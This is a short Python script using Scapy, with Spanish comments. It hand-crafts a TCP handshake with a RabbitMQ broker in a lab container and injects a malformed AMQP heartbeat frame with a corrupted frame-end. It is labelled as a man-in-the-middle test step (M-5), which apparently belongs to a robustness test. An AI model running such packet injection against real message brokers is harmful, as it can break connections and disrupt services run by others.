from scapy.all import *

BROKER = "192.168.20.4"   # IP del contenedor rabbit

ip  = IP(dst=BROKER)
syn = sr1(ip/TCP(sport=RandShort(), dport=5672, flags="S"), timeout=2)
if not syn:
    exit("No SYN-ACK")

ack = TCP(sport=syn.dport, dport=5672,
          seq=syn.ack, ack=syn.seq + 1, flags="A")

# Heartbeat con frame-end corrupto
BAD = b"\x08\x00\x01\x00\x00\x00\x00\x00\xCF"
send(ip/ack/BAD)
print("[MITM] Heartbeat inválido enviado (M-5)")
